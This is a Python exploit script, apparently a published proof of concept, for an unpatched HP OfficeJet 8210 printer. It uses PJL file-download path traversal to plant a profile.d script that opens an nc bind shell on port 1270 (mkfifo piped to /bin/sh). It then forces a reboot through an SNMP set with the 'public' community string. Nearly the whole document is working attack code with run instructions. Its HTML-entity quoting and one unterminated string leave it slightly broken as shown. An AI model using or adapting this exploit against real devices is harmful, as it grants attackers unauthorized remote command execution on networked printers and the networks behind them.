# Create a bind shell on an unpatched OfficeJet 8210
# Write a script to profile.d and reboot the device. When it comes
# back online then nc to port 1270.
#
# easysnmp instructions:
# sudo apt-get install libsnmp-dev
# pip install easysnmp
##
 
import socket
import sys
from easysnmp import snmp_set
 
profile_d_script = (&#039;if [ ! -p /tmp/pwned ]; then\n&#039;
                    &#039;\tmkfifo /tmp/pwned\n&#039;
                    &#039;\tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &\n
                    &#039;fi\n&#039;)
 
if len(sys.argv) != 3:
    print &#039;\nUsage:upload.py [ip] [port]\n&#039;
    sys.exit()
 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
server_address = (sys.argv[1], int(sys.argv[2]))
print &#039;connecting to %s port %s&#039; % server_address
sock.connect(server_address)
 
dir_query = &#039;@PJL FSDOWNLOAD FORMAT:BINARY SIZE=&#039; + str(len(profile_d_script)) + &#039; NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n&#039;
dir_query += profile_d_script
dir_query += &#039;\x1b%-12345X&#039;
sock.sendall(dir_query)
sock.close()
 
sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock1.connect(server_address)
dir_query = &#039;@PJL FSQUERY NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n&#039;
sock1.sendall(dir_query)
 
response = &#039;&#039;
while True:
    data = sock1.recv(1)
    if &#039;\n&#039; == data: break
    response += data
 
print response
snmp_set(&#039;.1.3.6.1.2.1.43.5.1.1.3.1&#039;, 4, &#039;integer&#039;, hostname=&#039;192.168.1.158&#039;, community=&#039;public&#039;, version=1)
print &#039;Done! Try port 1270 in ~30 seconds&#039;

